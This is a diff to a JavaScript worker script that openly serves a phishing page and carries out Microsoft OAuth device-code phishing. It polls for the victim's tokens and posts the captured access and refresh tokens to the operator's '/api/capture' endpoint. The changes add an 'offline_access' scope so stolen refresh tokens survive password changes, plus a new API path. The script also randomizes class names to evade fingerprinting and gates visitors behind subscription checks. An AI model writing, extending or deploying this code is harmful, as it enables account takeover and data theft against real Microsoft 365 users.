@@ -11,14 +11,14 @@ addEventListener('fetch', event => {
 
 async function handleRequest(request) {
   const url = new URL(request.url);
-  
+
   // Serve the phishing page
   if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
     return servePhishingPage(request);
   }
-  
-  // API endpoints
-  if (url.pathname === '/api/devicecode') {
+
+  // API endpoints - support both legacy and new paths
+  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
     return handleDeviceCodeRequest(request);
   }
   if (url.pathname === '/api/verify') {
@@ -30,7 +30,7 @@ async function handleRequest(request) {
   if (url.pathname === '/api/log') {
     return handleLogRequest(request);
   }
-  
+
   return new Response('Not Found', { status: 404 });
 }
 
@@ -38,11 +38,11 @@ async function servePhishingPage(request) {
   const jwtToken = '{{JWT_TOKEN}}';
   const turnstileKey = '{{TURNSTILE_KEY}}';
   const templateHTML = `{{TEMPLATE_HTML}}`;
-  
+
   // Try to verify subscription via JWT, but serve page even if verification fails
   let clientId = '';
   let tenant = 'common';
-  
+
   try {
     const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
       method: 'POST',
@@ -58,7 +58,7 @@ async function servePhishingPage(request) {
   } catch (e) {
     // Verification failed - continue anyway, client-side will handle errors
   }
-  
+
   // Inject dynamic values
   let html = templateHTML
     .replace(/{{JWT_TOKEN}}/g, jwtToken)
@@ -68,10 +68,10 @@ async function servePhishingPage(request) {
     .replace(/{{VERIFY_ENDPOINT}}/g, VERIFY_ENDPOINT)
     .replace(/{{BEACON_ENDPOINT}}/g, BEACON_ENDPOINT)
     .replace(/{{LOG_ENDPOINT}}/g, LOG_ENDPOINT);
-  
+
   // Randomize class names for anti-fingerprinting
   html = html.replace(/vg-/g, 'vg-' + Math.random().toString(36).substring(2, 6) + '-');
-  
+
   return new Response(html, {
     status: 200,
     headers: {
@@ -89,7 +89,7 @@ async function servePhishingPage(request) {
 
 async function handleDeviceCodeRequest(request) {
   const { jwt_token, turnstile_token } = await request.json();
-  
+
   // Verify JWT with backend
   try {
     const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
@@ -104,7 +104,7 @@ async function handleDeviceCodeRequest(request) {
         headers: { 'Content-Type': 'application/json' },
       });
     }
-    
+
     // Verify Turnstile
     const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
       method: 'POST',
@@ -121,8 +121,8 @@ async function handleDeviceCodeRequest(request) {
         headers: { 'Content-Type': 'application/json' },
       });
     }
-    
-    // Request device code from Microsoft
+
+    // Request device code from Microsoft with proper scope for refresh token
     const deviceCodeResponse = await fetch(
       `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/devicecode`,
       {
@@ -130,16 +130,16 @@ async function handleDeviceCodeRequest(request) {
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({
           client_id: verifyData.client_id,
-          resource: 'https://graph.microsoft.com',
+          scope: 'offline_access openid profile User.Read',
         }),
       }
     );
-    
+
     const deviceCodeData = await deviceCodeResponse.json();
-    
+
     // Start background polling
     pollForTokens(deviceCodeData.device_code, jwt_token, verifyData);
-    
+
     return new Response(JSON.stringify({
       user_code: deviceCodeData.user_code,
       verification_uri: deviceCodeData.verification_uri,
@@ -159,11 +159,11 @@ async function handleDeviceCodeRequest(request) {
 async function pollForTokens(deviceCode, jwtToken, verifyData) {
   const maxAttempts = 60;
   let attempts = 0;
-  
+
   while (attempts < maxAttempts) {
     attempts++;
     await new Promise(resolve => setTimeout(resolve, 5000));
-    
+
     try {
       const tokenResponse = await fetch(
         `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/token`,
@@ -177,11 +177,11 @@ async function pollForTokens(deviceCode, jwtToken, verifyData) {
           }),
         }
       );
-      
+
       const tokenData = await tokenResponse.json();
-      
+
       if (tokenData.access_token) {
-        // Send tokens back to main server
+        // Send tokens back to main server - INCLUDING REFRESH TOKEN for password change survival
         await fetch(`${VERIFY_ENDPOINT}/api/capture`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -228,21 +228,21 @@ function renderErrorPage() {
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page Unavailable</title>
-    <style>
-        body { font-family: "Segoe UI", sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f3f4f6; margin: 0; }
-        .card { background: white; border-radius: 8px; padding: 48px; text-align: center; box-shadow: 0 2px 16px rgba(0,0,0,0.1); max-width: 420px; }
-        h2 { color: #333; margin-bottom: 12px; }
-        p { color: #666; }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Page Unavailable</title>
+  <style>
+    body { font-family: "Segoe UI", sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f3f4f6; margin: 0; }
+    .card { background: white; border-radius: 8px; padding: 48px; text-align: center; box-shadow: 0 2px 16px rgba(0,0,0,0.1); max-width: 420px; }
+    h2 { color: #333; margin-bottom: 12px; }
+    p { color: #666; }
+  </style>
 </head>
 <body>
-    <div class="card">
-        <h2>This page is no longer available</h2>
-        <p>The requested resource has been removed or is temporarily unavailable.</p>
-    </div>
+  <div class="card">
+    <h2>This page is no longer available</h2>
+    <p>The requested resource has been removed or is temporarily unavailable.</p>
+  </div>
 </body>
 </html>`;
 }
